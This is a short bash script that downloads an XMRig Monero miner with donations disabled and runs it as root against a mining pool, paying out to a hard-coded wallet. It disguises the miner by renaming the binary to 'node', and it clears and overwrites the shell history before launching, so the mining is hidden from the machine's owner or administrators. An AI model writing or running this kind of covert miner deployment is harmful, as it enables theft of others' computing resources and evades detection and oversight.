#!/bin/bash
sudo apt update && sudo apt install libuv1-dev libssl-dev libhwloc-dev
curl https://github.com/Maks1mS/xmrig-zero-donation/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz  -L -O -J
tar -xf xmrig-6.21.0-linux-static-x64.tar.gz
rm xmrig-6.21.0-linux-static-x64.tar.gz
cd xmrig-6.21.0
mv ./xmrig ./node
history -c && history -w && clear
sudo ./node --coin="XMR" --randomx-1gb-pages --donate-level 0 -o sg.salvium.herominers.com:1230 -u SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.CPU2 -p x -k -t 4
